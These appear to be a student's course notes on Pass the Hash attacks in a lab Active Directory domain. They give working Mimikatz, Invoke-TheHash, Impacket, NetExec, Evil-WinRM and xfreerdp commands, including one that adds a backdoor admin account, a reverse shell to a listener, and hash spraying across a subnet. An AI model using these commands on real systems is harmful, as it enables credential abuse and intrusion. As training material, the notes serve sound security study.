# 🔓 Pass the Hash (PtH)

> **Module Section:** 20 / 26 — Password Attacks

## Overview

A **Pass the Hash (PtH)** attack is a technique where an attacker uses a password hash **instead of the plaintext password** for authentication. The attacker doesn't need to decrypt the hash — PtH exploits the authentication protocol itself, since the password hash remains static for every session until the password is changed.

---

## How Hashes Are Obtained

The attacker must have **administrative or specific privileges** on the target to obtain a password hash:

| Source | Description |
|--------|-------------|
| **Local SAM database** | Dump hashes from a compromised host |
| **NTDS database (`ntds.dit`)** | Extract hashes from a Domain Controller |
| **LSASS memory (`lsass.exe`)** | Pull hashes from memory |

### Example Scenario
- **Target Hash:** `64F12CDDAA88057E06A81B54E73B949B`
- **Target Account:** `julio`
- **Domain:** `inlanefreight.htb`

> 💡 Lab tooling located at `C:\tools` on MS01. Pivot from MS01 → DC01.

---

## Windows NTLM Background

**NTLM** (New Technology LAN Manager) is Microsoft's set of security protocols for authentication via a **challenge-response** mechanism — no password needs to be provided during the session.

| Property | Detail |
|----------|--------|
| **SSO** | Single Sign-On capable |
| **Current status** | Still supported for legacy compatibility |
| **Replacement** | **Kerberos** (default since Windows 2000 / AD) |
| **Critical flaw** | Passwords on server/DC are **not salted** — hash alone is sufficient for auth |

> ⚠️ Because NTLM hashes are not salted, an attacker with the hash can authenticate without ever knowing the password. This is the foundation of the PtH attack.

---

## 🪟 PtH from Windows

### 🛠 Mimikatz — `sekurlsa::pth`

Starts a process using the hash of the user's password.

#### Required Parameters

| Parameter | Purpose |
|-----------|---------|
| `/user` | Username to impersonate |
| `/rc4` or `/NTLM` | NTLM hash |
| `/domain` | Target domain (use `.`, `localhost`, or computer name for local accounts) |
| `/run` | Process to launch (defaults to `cmd.exe`) |

#### Command

```cmd
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

#### Result
A new `cmd.exe` runs with `julio`'s context — allowing access to resources like `\\DC\julio` share.

---

### 🛠 Invoke-TheHash (PowerShell)

A collection of PowerShell functions for PtH via **WMI** and **SMB**, using `.NET TCPClient` connections. Authentication passes an NTLM hash into the NTLMv2 protocol.

| Requirement | Detail |
|-------------|--------|
| **Client-side** | Local admin **NOT** required |
| **Target-side** | User/hash must have **admin rights** on target |

#### Parameters

| Parameter | Purpose |
|-----------|---------|
| `-Target` | Hostname or IP of target |
| `-Username` | User for authentication |
| `-Domain` | Auth domain (omit for local or `@domain` syntax) |
| `-Hash` | NTLM hash (`LM:NTLM` or `NTLM` format) |
| `-Command` | Command to execute (omit to just test WMI access) |

#### SMB Exec Example — Create Admin User

```powershell
PS c:\tools\Invoke-TheHash> Import-Module .\Invoke-TheHash.psd1
PS c:\tools\Invoke-TheHash> Invoke-SMBExec -Target 172.16.1.10 -Domain inlanefreight.htb `
    -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B `
    -Command "net user mark Password123 /add && net localgroup administrators mark /add" -Verbose
```

#### WMI Exec Example — Reverse Shell

1. Start a listener on attacker box (`172.16.1.5`):

   ```powershell
   PS C:\tools> .\nc.exe -lvnp 8001
   ```

2. Generate a base64 PowerShell payload at [revshells.com](https://www.revshells.com) (PowerShell #3 Base64).

3. Execute via WMI (hostname `DC01` works as well as IP):

   ```powershell
   PS c:\tools\Invoke-TheHash> Invoke-WMIExec -Target DC01 -Domain inlanefreight.htb `
       -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B `
       -Command "powershell -e <BASE64_PAYLOAD>"
   ```

Result: Reverse shell from DC01 → attacker machine.

---

## 🐧 PtH from Linux

### 🛠 Impacket

Impacket provides multiple execution methods for PtH attacks.

#### `impacket-psexec`

```bash
impacket-psexec administrator@10.129.201.126 -hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

Output:
```
[*] Found writable share ADMIN$
[*] Uploading file SLUBMRXK.exe
[*] Opening SVCManager on 10.129.201.126.....
[*] Starting service AdzX.....
C:\Windows\system32>
```

#### Other Impacket Execution Tools

| Tool | Protocol | Stealth |
|------|----------|---------|
| `impacket-psexec` | SMB (service creation) | 🔴 Noisy |
| `impacket-wmiexec` | WMI | 🟡 Quieter |
| `impacket-atexec` | Task Scheduler | 🟡 Quieter |
| `impacket-smbexec` | SMB (alternative) | 🟡 Quieter |

> 💡 **Hash format:** `LM:NTLM` — use blank LM (`:<NTLM>`) when only NTLM is known.

---

### 🛠 NetExec (`nxc`)

Post-exploitation tool to automate Active Directory assessment — great for **password spraying** and identifying hosts where hash reuse grants access.

#### Spray Hash Across a Subnet

```bash
netexec smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
```

Output:
```
SMB  172.16.1.10  445  DC01  [-] .\Administrator:... STATUS_LOGON_FAILURE
SMB  172.16.1.5   445  MS01  [+] .\Administrator ... (Pwn3d!)
```

| Flag | Purpose |
|------|---------|
| `-d .` | Use local auth domain |
| `-H <hash>` | NTLM hash |
| `--local-auth` | Force local account authentication across the subnet |
| `-x <cmd>` | Execute a command on successful hosts |

#### Execute Command

```bash
netexec smb 10.129.201.126 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453 -x whoami
```

> ⚠️ **Lockout risk:** Password spraying can lock domain accounts. Check the domain lockout policy first. Use `--local-auth` to avoid domain-wide lockouts.

> 💡 **Real-world fix:** Recommend **LAPS (Local Administrator Password Solution)** to randomize and rotate local admin passwords.

---

### 🛠 Evil-WinRM

Use **PowerShell Remoting (WinRM)** for PtH when SMB is blocked.

```bash
evil-winrm -i 10.129.201.126 -u Administrator -H 30B3783CE2ABF1AF70F77D0660CF3453
```

> 💡 For domain accounts, use the UPN format: `administrator@inlanefreight.htb`

---

### 🛠 xfreerdp — PtH over RDP

Gain **GUI access** to the target via PtH.

#### ⚠️ Caveat — Restricted Admin Mode

Must be enabled on target, otherwise RDP will fail with:
> *Account restrictions prevent signing in due to blank passwords, limited sign-in times, or policy restrictions.*

#### Enable on Target

```cmd
c:\tools> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

#### Connect

```bash
xfreerdp /v:10.129.201.126 /u:julio /pth:64F12CDDAA88057E06A81B54E73B949B
```

---

## ⚠️ UAC Limits PtH for Local Accounts

**UAC (User Account Control)** restricts local users from performing remote administration.

### Registry Key: `LocalAccountTokenFilterPolicy`

Path: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`

| Value | Effect |
|-------|--------|
| `0` (default) | **Only RID-500** (built-in Administrator) can do remote admin |
| `1` | All local admin accounts permitted to do remote admin |

### Exception: `FilterAdministratorToken`

When enabled (value `1`, disabled by default), **RID-500 is enrolled in UAC protection** — even if renamed — breaking remote PtH using that account.

> 💡 **Domain accounts are exempt** — these UAC restrictions only apply to local accounts. A domain account with admin rights on a box can always PtH to it.

📖 **Further reading:** [Will Schroeder — *Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy*](https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/)

---

## Tool Comparison

| Tool | Platform | Protocol | Strength |
|------|----------|----------|----------|
| **Mimikatz** | Windows | Kerberos/NTLM via process injection | Local impersonation as `julio` |
| **Invoke-TheHash** | Windows | SMB / WMI | Lateral movement without local admin client-side |
| **Impacket** | Linux | SMB / WMI / RPC | Wide toolkit for PtH |
| **NetExec** | Linux | SMB / WinRM / etc. | Mass auth testing + command exec |
| **Evil-WinRM** | Linux | WinRM | Interactive shell when SMB blocked |
| **xfreerdp** | Linux | RDP | GUI access (needs Restricted Admin Mode) |

---

## Key Takeaways

1. **PtH exploits the protocol, not the hash** — no cracking needed
2. NTLM hashes are **not salted**, making PtH trivially possible
3. Three main hash sources: **SAM**, **NTDS.dit**, **LSASS memory**
4. From Windows: **Mimikatz** (local impersonation) + **Invoke-TheHash** (remote SMB/WMI)
5. From Linux: **Impacket**, **NetExec**, **Evil-WinRM**, **xfreerdp** cover every major protocol
6. **UAC (`LocalAccountTokenFilterPolicy`)** limits PtH for local accounts — only RID-500 works by default
7. **Domain admin accounts bypass** UAC restrictions for remote admin
8. **LAPS** is the recommended defensive control against hash reuse
9. For RDP PtH, **Restricted Admin Mode** must be enabled on target
10. Watch for **account lockouts** when spraying — use `--local-auth` where possible

---

## Exercise

*Add exercise answers here as you complete them*

---

## References

- [Mimikatz GitHub](https://github.com/gentilkiwi/mimikatz)
- [Invoke-TheHash GitHub](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [Impacket GitHub](https://github.com/fortra/impacket)
- [NetExec Wiki](https://www.netexec.wiki/)
- [Evil-WinRM GitHub](https://github.com/Hackplayers/evil-winrm)
- [revshells.com](https://www.revshells.com)
